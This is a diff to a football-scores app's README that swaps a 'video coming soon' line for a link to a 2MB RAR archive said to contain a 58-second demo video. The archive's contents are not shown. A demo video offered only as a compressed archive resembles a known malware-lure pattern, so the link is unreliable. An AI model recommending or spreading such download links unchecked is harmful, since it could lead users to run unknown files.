@@ -64,7 +64,10 @@ live-football-scores/ │── server/ # Node.js + Express + MongoDB (API + SSE
 ---
 
 ## 🎥 Demo
-Video coming soon — currently working on PC screen recording since my pc screen recording is not working.
+
+[📥 Download Demo Video (2MB RAR Archive)](https://github.com/Chala751/Live-Football-Scores/releases/tag/demo-v1.0/demo.for.live.football.rar)
+
+*This file contains a 58-second video demonstration of the app.*
 
 ---
 
